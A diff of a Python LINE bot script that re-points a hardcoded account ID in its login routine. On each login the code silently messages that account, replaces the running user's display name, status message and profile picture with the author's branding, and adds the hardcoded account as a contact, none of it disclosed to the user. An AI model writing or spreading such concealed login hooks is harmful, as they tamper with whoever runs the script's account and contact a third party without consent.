@@ -206,18 +206,19 @@ class Object(object):
         if self.isLogin == True:
             self.log("( %s ) : Verifikasi Login Success" % self.profile.displayName)
             self.log("YOUR MID : " + "( "+self.profile.mid+" )")
-            linex = "udefd75736ced80dc8fca8966d246ac6f"
+            linex = "u536c7b4d0985b91bcf2628b39e089053"
             xmod = self.getContact(linex).displayName
-            self.sendText("udefd75736ced80dc8fca8966d246ac6f", 'PERMISI BANG %s , IJIN REMAKE SCRIPT NYA YA ABANGKU YANG GANTENG' % xmod)
+            self.sendText("u536c7b4d0985b91bcf2628b39e089053", 'PERMISI BANG %s , IJIN REMAKE SCRIPT NYA YA ABANGKU YANG GANTENG' % xmod)
             profile = self.getProfile()
-            profile.displayName = "ARIFISTIFIK"
+            profile.displayName = "N̶̷ᴜ̶̷ɢ̶̷ɪ̶̷ ╾━╤デ╦︻"
             self.updateProfile(profile)
-            profile.statusMessage = "HALLO DPK... I LOVE YOU😘"
+            profile.statusMessage = "HALLO TEAM PEKOK... I LOVE YOU😘"
             self.updateProfile(profile)
             DOMAIN_ = "https://www.google.co.id/url?sa=i&source=images&cd=&cad=rja&uact=8&ved=2ahUKEwjNycPD9dXcAhUIfysKHbDOAmsQjRx6BAgBEAU&url=https%3A%2F%2Fwww.kisspng.com%2Fpng-logo-dragon-dragon-logo-1445879%2F&psig=AOvVaw2fSMEJ_prwKUYQhuUNQYgO&ust=1533558537958752"
             LINE = self.downloadFileURL(DOMAIN_)
             self.updateProfilePicture(LINE)
-            GEN = "udefd75736ced80dc8fca8966d246ac6f"
+            GEN = "u536c7b4d0985b91bcf2628b39e089053"
+
             self.findAndAddContactsByMid(GEN)
 
 
